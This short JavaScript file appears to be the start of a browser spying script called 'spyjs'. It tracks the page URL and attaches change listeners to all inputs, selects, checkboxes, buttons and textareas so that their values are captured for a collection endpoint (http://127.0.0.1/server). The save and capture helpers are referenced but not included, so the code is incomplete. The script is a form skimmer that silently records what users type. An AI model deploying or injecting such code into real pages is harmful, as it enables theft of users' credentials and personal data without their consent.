var url = "http://127.0.0.1/server"; 
var debug = 1;
var currLoc = "";
spyjs_refreshEvents();

function spyjs_refreshEvents(){
	if(currLoc != location.href){
		currLoc=location.href;
		if(debug){
			console.log(currLoc);
		}
		spyjs_saveData("("+currLoc+")");
	}
	$('input').unbind('change');
	$('input').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	$('select').unbind('change');
	$('select').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	$('checkbox').unbind('change');
	$('checkbox').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	$('button').unbind('change');
	$('button').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	
	$('textarea').unbind('change');
	$('textarea').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
}